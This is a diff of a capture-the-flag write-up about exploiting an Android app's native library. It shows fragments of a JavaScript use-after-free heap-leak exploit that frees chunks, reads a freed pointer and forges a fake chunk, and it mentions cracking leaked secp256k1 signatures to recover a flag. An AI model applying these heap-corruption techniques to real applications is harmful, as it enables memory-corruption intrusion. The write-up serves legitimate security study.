@@ -10,13 +10,13 @@ Author: k0m1, tourpran, apn
 
 In this task, I encountered an Android application with a vulnerable native library. The application exposes a JavaScript interface to interact with the library and executes JavaScript code from a user-provided URL.
 
-First, I reverse engineered the [APK file](./task/Handout/app.apk) and its native libraries to understand the functionality, identify the vulnerability, and find a way to retrieve the flag.
+First, I [reverse engineered](#apk-analysis) the [APK file](./task/Handout/app.apk) and its native libraries to understand the functionality, identify the vulnerability, and find a way to retrieve the flag.
 
-After that, I [prepared](#Environment%20Setup) an environment for working with the application inside a Docker container, including running emulator, debugging native code and interacting with it through JavaScript.
+After that, I [prepared](#environment-setup) an environment for working with the application inside a Docker container, including running emulator, debugging native code and interacting with it through JavaScript.
 
-Next, I exploited a use-after-free vulnerability in the native library to leak data from the allocator's heap using an [exploit](./task/exploit.html) written in JavaScript.
+Next, I [exploited](#exploitation-heap-leak) a use-after-free vulnerability in the native library to leak data from the allocator's heap using an [exploit](./task/exploit.html) written in JavaScript.
 
-The leaked data contained results of a cryptographic operation, which I cracked using secret zoomer's technique to create Python [script](./task/solve.py) and recover the flag.
+The leaked data contained results of a cryptographic operation, which I [cracked](#exploitation-crypto-puzzle) using secret zoomer's technique to create Python [script](./task/solve.py) and recover the flag.
 
 ## First Look
 
@@ -1192,11 +1192,11 @@ function exploit()
   const aaaa  = add(junk);
   const bbbb  = add(junk);
                 add(junk); // guard
-  // Free aaaa and bbbb to make bbbb.BKD == aaaa
+  // Free aaaa and bbbb to make bbbb.FWD == aaaa
   del(aaaa);
   del(bbbb);
 
-  // Leak heap address from aaaa (read bbbb.BKD)
+  // Leak heap address from aaaa (read bbbb.FWD)
   const heap          = BigInt(read(aaaa)) - 0x40n;
 
   // Compute addresses we need using fixed heap offset
@@ -1234,7 +1234,7 @@ function exploit()
     edit2(biba, arr);
 
     // Write fake Boba to it's place using the previous one
-    arr =            pack(0x20n);       // Size
+    arr =            pack(0x20n);       // SIZE
     arr = arr.concat(pack(0x00n));      // FWD
     arr = arr.concat(pack(biba_start)); // BKD
     edit2(boba, arr);
@@ -1284,7 +1284,7 @@ cipher     = leak_bytes[0x50*2:0x50*2+0x20]
 ```
 It simply puts all the qwords we leaked together and then extracts our crypto values from them using known heap leak offsets.
 
-After that, we come to another question: what is the format of the values we leaked? Here, we return to the strange thing we noticed in the `trigger_encryption` function — it saves its results without serialization. So, we have some platform-dependent format of signatures. Probably, we want to serialize them ourselves to use a more widely accepted format for future cracking. “Similia similibus curantur,” so let's write a small piece of C code that serializes our signatures using the [same secp256k1 library](https://github.com/bitcoin-core/secp256k1) but [compiled](./task/libsecp256k1.a) by ourselves:
+After that, we come to another question: what is the format of the values we leaked? Here, we return to the strange thing we noticed in the `trigger_encryption` function — it saves its results without serialization. So, we have some platform-dependent format of signatures. Probably, we want to serialize them ourselves to use a more widely accepted format for future cracking. “Similia similibus curantur,” so let's write a small piece of C code that serializes our signatures using the same secp256k1 [library](https://github.com/bitcoin-core/secp256k1) but [compiled](./task/libsecp256k1.a) by ourselves:
 ```c
 /*
  *  $ gcc -o convert convert.c libsecp256k1.a
